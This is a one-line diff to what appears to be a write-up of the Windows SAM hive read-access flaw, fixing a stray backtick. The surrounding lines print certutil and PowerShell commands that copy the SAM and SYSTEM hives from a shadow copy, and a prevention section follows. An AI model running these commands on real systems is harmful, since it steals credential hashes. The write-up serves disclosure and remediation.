@@ -31,7 +31,7 @@ A vulnerable system will report ```BUILTIN\Users:(I)(RX)```
 - ```certutil -decode SYSTEM.encoded SYSTEM.hive```
 - ```certutil -encode \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SAM SAM.encoded```
 - ```certutil -decode SAM.encoded SAM.hive```
-- ```powershell.exe -c "[Console]::OpenStandardInput().CopyTo([Console]::OpenStandardOutput())" <"\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM"> sam_export.txt````
+- ```powershell.exe -c "[Console]::OpenStandardInput().CopyTo([Console]::OpenStandardOutput())" <"\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM"> sam_export.txt```
 
 ## Prevention
 Restrict access to %windir%\system32\config and remove VSS shadow copies. On a command prompt with administrative privileges:
